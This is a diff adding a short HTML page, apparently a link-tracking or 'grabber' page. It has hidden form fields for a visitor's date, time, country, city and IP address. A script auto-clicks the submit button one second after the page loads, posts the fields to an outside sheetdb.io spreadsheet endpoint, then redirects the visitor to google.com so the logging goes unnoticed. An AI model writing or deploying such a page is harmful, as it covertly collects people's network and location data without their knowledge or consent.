@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en" class="html">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sheet DB example</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <script src="script.js"></script>
+    <form action="https://sheetdb.io/api/v1/6mcgdvj2dbi04" method="post" class="main-form" id="sheetdb-form">
+
+        <input type="text" name="data[date]" class="hidden" id="date">
+        <input type="text" name="data[time]" class="hidden" id="time">
+        <input type="text" name="data[country]" class="hidden" id="country">
+        <input type="text" name="data[city]" class="hidden" id="city">
+        <input type="text" name="data[ip]" class="hidden" id="ip">
+        <button type="submit" class="submit" id="hidden-btn">SUBMIT</button>
+    </form>
+    
+    <script>
+        let getinfo = {
+          send: function () {
+            var form = document.getElementById('sheetdb-form');
+            form.addEventListener("click", e => {
+              e.preventDefault();
+              fetch(form.action, {
+                  method : "POST",
+                  body: new FormData(document.getElementById("sheetdb-form")),
+              }).then(
+                  response => response.json()
+              ).then((html) => {
+                // you can put the link you want to visitor to jump
+                location.replace("https://google.com");
+              });
+            });
+
+          },
+      };
+
+
+    
+      addEventListener('load', (event) => {
+        var pagebutton= document.querySelector(".submit");
+        setTimeout(() => pagebutton.click(), 1000);
+      });
+
+      </script>
+
+
+
+
+</body>
+</html>
